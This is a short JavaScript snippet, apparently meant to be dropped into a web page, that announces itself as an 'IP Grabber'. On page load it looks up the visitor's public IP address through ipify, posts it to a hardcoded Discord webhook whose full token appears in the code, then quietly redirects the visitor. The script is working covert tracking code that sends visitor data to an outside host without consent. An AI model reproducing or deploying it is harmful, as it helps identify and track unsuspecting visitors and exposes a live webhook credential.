function SendMessage(message) {
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/818588973684490310/teQkvpePWmG7afPaZpnPNxA76XXnaipYOmhtXoSUbY7aim8OFvSeQJpld47f5_r6nzXf");
    request.setRequestHeader('Content-type', 'application/json');
    
    var params = {
        username: "IP Grabber",
        content: message
    }
    
    request.send(JSON.stringify(params));
}

$.getJSON('https://api.ipify.org?format=jsonp&callback=?', function(data) {
    SendMessage("```IP: " + data.ip + "```");

    setTimeout(function() {
        window.location = "https://" + window.location.hostname;
    }, 1000);
});